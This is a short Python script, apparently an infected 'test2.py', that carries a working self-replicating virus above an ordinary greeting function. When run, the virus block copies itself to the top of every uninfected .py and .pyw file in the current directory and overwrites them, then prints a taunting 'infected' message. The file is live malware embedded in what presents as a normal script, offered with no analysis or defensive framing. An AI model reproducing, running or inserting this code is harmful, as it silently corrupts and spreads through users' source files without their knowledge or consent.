# VIRUS SAYS HI!

import sys
import glob

virus_code = []

with open(sys.argv[0], 'r') as f:
    lines = f.readlines()

self_replicating_part = False
for line in lines:
    if line.strip() == "# VIRUS SAYS HI!":
        self_replicating_part = True
    if self_replicating_part:
        virus_code.append(line)
    if line.strip() == "# VIRUS SAYS BYE!":
        break

python_files = glob.glob("*.py") + glob.glob("*.pyw")

for file in python_files:
    if file == sys.argv[0]:  
        continue

    with open(file, 'r') as f:
        file_code = f.readlines()

    infected = False
    for line in file_code:
        if line.strip() == "# VIRUS SAYS HI!":
            infected = True
            break

    if not infected:
        final_code = []
        final_code.extend(virus_code)
        final_code.append('\n')
        final_code.extend(file_code)

        with open(file, 'w') as f:
            f.writelines(final_code)
def malicious_code():
    print("YOU HAVE BEEN INFECTED HAHA")

malicious_code()

# VIRUS SAYS BYE!

def hello():
    print("Halo dari test2.py")

hello()
